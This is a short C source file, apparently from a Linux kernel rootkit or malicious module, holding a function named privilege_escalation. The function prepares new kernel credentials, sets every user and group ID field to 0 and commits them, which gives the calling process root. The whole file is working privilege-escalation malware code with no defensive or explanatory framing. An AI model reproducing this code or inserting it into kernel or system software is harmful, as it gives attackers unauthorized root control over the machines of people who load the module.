#include "utils.h"
#include "privilege_escalation.h"

int privilege_escalation(void) {
    struct cred *new_cred;
    if ((new_cred = prepare_creds ()) == NULL)
	{
        debug("Cannot prepare credentials");
	    return 0;
    }

    V(new_cred->uid) = V(new_cred->gid) =  0;
    V(new_cred->euid) = V(new_cred->egid) = 0;
    V(new_cred->suid) = V(new_cred->sgid) = 0;
    V(new_cred->fsuid) = V(new_cred->fsgid) = 0;
    commit_creds (new_cred);

    return 1;
}